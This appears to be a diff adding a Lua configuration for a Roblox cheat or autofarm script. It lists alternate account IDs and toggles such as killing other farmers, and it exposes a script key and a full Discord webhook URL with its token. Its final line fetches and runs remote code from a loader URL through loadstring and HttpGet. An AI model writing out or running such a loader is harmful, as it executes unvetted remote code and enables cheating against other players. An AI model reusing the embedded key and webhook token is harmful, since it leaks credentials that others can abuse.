@@ -1,0 +1,70 @@
+script_key="evFVJygmuzBOMwUUiLiznAnhksrKaCNV"
+
+_G.polarsblade = {
+    client = {
+        fps = 15,
+        rendering = true,
+        gui = true,
+    },
+    items = {
+        mask = true,
+        unjail = true,
+    },
+    server = {
+        handlekicks = false,
+        serverhoponknock = false,
+        serverhoponnoregisters = false,
+        
+        otheraccounts = {
+            switch = true,
+            ids = {
+        7239506305,
+        7239121469,
+        7239514345,
+        7239502073,
+        7239508408,
+        7239185474,
+        7239506522,
+        7239518914,
+        7239515999,
+        7239511964,
+        7239516536,
+        7239512083,
+        7239518656,
+        7239524315,
+        7239540424,
+        7239533611,
+        7239543428,
+        7239523894,
+        7239526331,
+        7239357484,
+        7239534726,
+        7239547480,
+        7239589842,
+        7239591794,
+        7239603017,
+        7239601065,
+        7239592373,
+        7239609511,
+        7239592434,
+        7239616883,
+        7238863052,
+        7239605161,
+        7239600288,
+        7239619975,
+        7239619029,
+        7239613158,
+            }
+        }
+    },
+    otherfarmers = {
+        killfarmers = true,
+        jumpatms = false,
+    },
+    webhook = {
+        switch = true,
+        link = "https://discord.com/api/webhooks/1277079535057109137/_5Olw3rtMa60TF1BNDq1XqTScni5kB3-Fmezm63mCJZh32gioVwhUe-7Qs1_AYbtO8CB",
+    },
+}
+
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/dcba12602570f5a1c36c86252d5f78c9.lua"))()
